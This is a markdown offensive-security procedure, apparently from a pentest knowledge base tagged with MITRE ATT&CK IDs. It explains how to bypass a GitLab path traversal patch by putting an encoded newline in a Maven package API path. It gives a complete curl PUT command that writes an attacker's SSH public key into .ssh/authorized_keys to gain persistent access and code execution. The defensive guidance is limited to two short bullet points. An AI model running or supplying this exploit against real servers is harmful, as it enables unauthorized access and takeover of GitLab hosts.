---
tags:
  - bypass
  - path-traversal
type: procedure
tools:
  - '[[tools/ssh]]'
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Linux
  - Docker
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: advanced
impact_level: high
detection_risk: medium
sub_techniques: []
id: 7f0e8b54-7809-4395-b8ab-a93bb16839d7
created_at: '2025-12-11T03:47:39.666Z'
updated_at: '2025-12-11T03:47:39.666Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1190]]'
---
# Bypass Initial Patch with Newline Payload

## Summary

This procedure demonstrates bypassing an initial patch for the path traversal vulnerability by incorporating a newline in the filename payload.

## Description

The initial patch may block standard traversal, but using %0a (newline) in the path allows continued exploitation, writing to arbitrary locations like .ssh/authorized_keys.

## Requirements

1. Patched GitLab instance
2. Valid API token
3. SSH public key

## Defense

Defensive measures and detection strategies:

- Apply comprehensive patches
- Scan for newline characters in API paths

## Objectives

1. Bypass regex validation
2. Achieve file write post-patch
3. Maintain RCE capability

## Instructions

### Step 1: Craft Bypass Payload

**Context**: Include newline in the URL path.

Prepare the URL with %0a%2f before traversal sequences.

> This evades updated filters.

### Step 2: Send Bypass Request

**Context**: Upload key using the bypass payload.

**Command** ([[commands/curl-bypass-patch]]):
```bash
curl -H "Private-Token: xQsDqzWrsUKsNCwdtXGT" http://10.26.0.3/api/v4/projects/1/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/a%0a%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub; echo
```

> Confirms write with JSON response.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-bypass-patch]]

## Tools Used

- #curl

## Tags

- [[commands/curl-bypass-patch]]
- [[commands/curl-path-traversal-exploit]]
